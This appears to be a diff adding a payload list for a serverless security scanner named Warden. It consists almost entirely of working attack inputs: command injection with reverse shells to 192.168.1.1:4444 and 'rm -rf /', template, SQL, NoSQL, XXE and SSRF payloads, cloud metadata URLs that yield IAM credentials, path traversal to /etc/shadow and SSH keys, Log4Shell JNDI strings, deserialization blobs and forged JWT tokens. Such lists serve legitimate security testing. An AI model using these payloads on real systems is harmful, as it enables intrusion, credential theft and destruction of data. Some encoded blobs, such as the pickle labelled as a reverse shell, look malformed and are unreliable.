@@ -1,0 +1,365 @@
+# Serverless Security Testing Payloads
+# For Warden v0.8.0 Enterprise Edition
+# Cloud Provider: AWS Lambda, Azure Functions, Google Cloud Functions
+
+# ============================================================================
+# INJECTION PAYLOADS - Lambda/Function Handlers
+# ============================================================================
+
+# Command Injection - Node.js
+;cat /etc/passwd
+|cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+;ls -la
+|ls -la
+&& whoami
+;id
+;env
+;printenv
+$(curl http://169.254.169.254/latest/meta-data/)
+`aws s3 ls`
+;rm -rf /
+;nc -e /bin/sh 192.168.1.1 4444
+;bash -i >& /dev/tcp/192.168.1.1/4444 0>&1
+
+# Command Injection - Python
+;os.system('cat /etc/passwd')
+__import__('os').system('id')
+subprocess.call('cat /etc/passwd', shell=True)
+;cat$IFS/etc/passwd
+|cat${IFS}/etc/passwd
+&&$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+$(python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);')
+
+# Code Injection - Node.js
+');return process.env;
+}process.env});
+eval('process.env')
+new Function('return process.env')()
+require('child_process').exec('id')
+require('fs').readFileSync('/etc/passwd')
+${7*7}
+${{7*7}}
+#{7*7}
+<%= system('id') %>
+#{system('id')}
+
+# Code Injection - Python
+{{7*7}}
+{{7*7}}
+{{config}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+${7*7}
+<%= system('cat /etc/passwd') %>
+#{7*7}
+
+# SSTI (Server-Side Template Injection)
+{{7*7}}
+${7*7}
+#{7*7}
+<%7*7%>
+{{7*7}}
+{{7*'7'}}
+${"abcdefghijklmnopqrstuvwxyz".toUpperCase()}
+{{config.items()}}
+{{settings.SECRET_KEY}}
+{{request.environ}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${'freemarker.template.utility.Execute'?new()('id')}
+
+# SQL Injection - Generic
+' OR '1'='1
+" OR "1"="1
+' UNION SELECT NULL--
+' UNION SELECT sname,sname,sname,sname,sname,sname,sname,sname,sname FROM master..syslogins--
+' OR 1=1--
+admin'--
+' OR 1=1#
+' OR 1=1/*
+') OR '1'='1--
+') OR ('1'='1--
+
+# NoSQL Injection - MongoDB
+{"$ne": null}
+{"$ne": ""}
+{"$regex": ".*"}
+{"$where": "this.password == 'password'"}
+{"$regex": "a.*"}
+{"$gt": ""}
+{"$in": [{"$ne": null}]}
+
+# SSRF Payloads
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/dynamic/instance-identity/
+http://169.254.169.254/latest/api/token
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/
+http://169.254.169.254/metadata/v1/maintenance
+http://127.0.0.1:8080
+http://localhost:8080
+http://[::1]:8080
+file:///etc/passwd
+file:///etc/hosts
+file:///etc/shadow
+dict:///etc/passwd
+gopher://127.0.0.1:8080/_GET%20/http://169.254.169.254
+
+# XXE Payloads
+<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
+
+# ============================================================================
+# ENVIRONMENT VARIABLE NAMES TO CHECK
+# ============================================================================
+
+# Common secret keys
+DB_PASSWORD
+DB_HOST
+DB_USER
+DATABASE_URL
+MONGO_URL
+MONGODB_URI
+REDIS_URL
+REDIS_HOST
+REDIS_PASSWORD
+API_KEY
+API_SECRET
+SECRET_KEY
+SECRET
+AWS_ACCESS_KEY_ID
+AWS_SECRET_ACCESS_KEY
+AWS_SESSION_TOKEN
+AZURE_STORAGE_KEY
+AZURE_STORAGE_CONNECTION_STRING
+GOOGLE_CREDENTIALS
+GOOGLE_APPLICATION_CREDENTIALS
+SLACK_TOKEN
+SLACK_WEBHOOK
+STRIPE_SECRET_KEY
+STRIPE_API_KEY
+TWILIO_AUTH_TOKEN
+SENDGRID_API_KEY
+JWT_SECRET
+OAUTH_SECRET
+ENCRYPTION_KEY
+PRIVATE_KEY
+SSL_CERTIFICATE
+DATABASE_PASSWORD
+SMTP_PASSWORD
+MAIL_PASSWORD
+S3_BUCKET
+S3_ACCESS_KEY
+S3_SECRET_KEY
+CLOUDflare_API_KEY
+NEW_RELIC_LICENSE_KEY
+DATADOG_API_KEY
+PAGERDUTY_API_KEY
+GITHUB_TOKEN
+GITLAB_TOKEN
+NPM_TOKEN
+VAULT_TOKEN
+CONSUL_TOKEN
+KUBERNETES_MASTER_URL
+KUBECONFIG
+
+# ============================================================================
+# CLOUD-SPECIFIC ENDPOINTS (Metadata Services)
+# ============================================================================
+
+# AWS IMDSv1
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/instance-id
+http://169.254.169.254/latest/meta-data/instance-type
+http://169.254.169.254/latest/meta-data/local-ipv4
+http://169.254.169.254/latest/meta-data/local-hostname
+http://169.254.169.254/latest/meta-data/placement/availability-zone
+http://169.254.169.254/latest/meta-data/identity-credentials/ec2/
+http://169.254.169.254/latest/meta-data/iam/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/role
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/latest/dynamic/instance-identity/pkcs7
+http://169.254.169.254/latest/api/token
+
+# AWS IMDSv2 (requires token)
+X-aws-ec2-metadata-token-ttl-seconds: 21600
+
+# Azure Instance Metadata Service
+http://169.254.169.254/metadata/v1/maintenance
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+http://169.254.169.254/metadata/loadbalancer?api-version=2021-05-01
+
+# Google Cloud Metadata Service
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/instance/name
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/machine-type
+http://metadata.google.internal/computeMetadata/v1/instance/zone
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
+
+# Alibaba Cloud Metadata Service
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/ram/security-credentials/
+
+# Oracle Cloud Metadata Service
+http://192.0.0.192/latest/
+http://192.0.0.192/latest/instance/
+http://192.0.0.192/latest/instance/instanceId
+
+# ============================================================================
+# IAM PERMISSION PATTERNS TO CHECK
+# ============================================================================
+
+# Dangerous wildcard permissions
+lambda:InvokeFunction
+lambda:InvokeFunction*
+s3:*
+s3:GetObject
+s3:PutObject
+s3:DeleteObject
+dynamodb:*
+dynamodb:Query
+dynamodb:Scan
+dynamodb:GetItem
+dynamodb:PutItem
+dynamodb:DeleteItem
+ec2:*
+ec2:RunInstances
+ec2:TerminateInstances
+iam:*
+iam:CreateRole
+iam:AttachRolePolicy
+iam:PassRole
+rds:*
+rds:CreateDBInstance
+rds:DeleteDBInstance
+sns:*
+sns:Publish
+sns:CreateTopic
+sqs:*
+sqs:SendMessage
+kms:*
+kms:Decrypt
+kms:CreateGrant
+secretsmanager:*
+secretsmanager:GetSecretValue
+ssm:*
+ssm:GetParameter
+ssm:GetParameters
+
+# ============================================================================
+# PATH TRAVERSAL PAYLOADS
+# ============================================================================
+
+../../../etc/passwd
+..\\..\\..\\..\\windows\\win.ini
+....//....//....//etc/passwd
+%2e%2e%2fetc%2fpasswd
+%252e%252e%252fetc%252fpasswd
+..%252f..%252fetc%252fpasswd
+..%c0%af..%c0%af..%c0%afetc/passwd
+%2e%2e%5c%2e%2e%5c%2e%2e%5cwin.ini
+..%5c..%5c..%5cwindows%5cwin.ini
+~/.ssh/id_rsa
+../../.ssh/config
+../../../../../../../../etc/passwd
+../../../../../../etc/shadow
+../../../../../../windows/system32/drivers/etc/hosts
+
+# ============================================================================
+# LOG4J / LOG4SHELL PAYLOADS
+# ============================================================================
+
+${jndi:ldap://127.0.0.1:1389/exploit}
+${jndi:rmi://127.0.0.1:1389/exploit}
+${jndi:dns://127.0.0.1:1389/exploit}
+${jndi:ldap://${lower:jndi}.127.0.0.1:1389/exploit}
+${jndi:ldap://${env:COMPUTERNAME}.127.0.0.1:1389/exploit}
+${jndi:ldap://assf3732Burx47xbur4.${hostName}.1389.burpcollaborator.net/exploit}
+${${lower:j}ndi:${lower:l}dap://127.0.0.1:1389/exploit}
+${${::-j}ndi:${::-l}dap://127.0.0.1:1389/exploit}
+${${lower:${lower:jndi}}:${lower:${lower:ldap}}://127.0.0.1:1389/exploit}
+
+# ============================================================================
+# DESERIALIZATION PAYLOADS
+# ============================================================================
+
+# Java serial
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAKVXNlck5hbWV0ABJMb2NhbCBVc2VyIFRlc3RzdEA
+# Apache Commons
+aced0005737200176a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000027404000000000000001737200116a6176612e6c616e672e496e74656765724112138c453db66a2402000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740400000000000000178707371007e00037870
+
+# Python pickle (bash reverse shell)
+gASVqwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJyzi5RQuHqLZ3JldC5wdHkfc29ja2V0LmdldHNvY2tub2FtZS5wZF9pcHquOaQumNhdCAvZXRjL3Bhc3N3ZECUhZRSlIWUjY0u
+
+# ============================================================================
+# AUTHORIZATION BYPASS PAYLOADS
+# ============================================================================
+
+# JWT None algorithm
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
+eyJhbGciOiJUb25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJodHRwOi8vdGVzdC5jb20iLCJ1c2VyIjoiYWRtaW4ifQ.
+
+# API Key bypass
+X-Api-Key: test
+x-api-key: test
+Authorization: Bearer test
+Authorization: null
+Authorization: undefined
+Authorization: Bearer null
+
+# ============================================================================
+# CLOUD FUNCTION SPECIFIC PAYLOADS
+# ============================================================================
+
+# AWS Lambda
+/function/invocation
+/2015-03-31/functions/function/invocations
+X-Amz-Target: Lambda.InvokeFunction
+{"FunctionName":"test","Payload":"$(id)"}
+
+# Azure Functions
+/admin/functions/sys/registration
+/admin/functions/test
+X-Functions-Key: test
+
+# Google Cloud Functions
+/_ah/api
+/_ah/warmup
+X-AppEngine-Inbound-AppId: test
+
+# ============================================================================
+# COMMON FUNCTION FILE PATHS
+# ============================================================================
+
+handler.js
+handler.py
+handler.go
+index.js
+index.py
+main.go
+function.js
+function.py
+app.py
+app.js
+lambda_function.py
+serverless.js
+serverless.ts
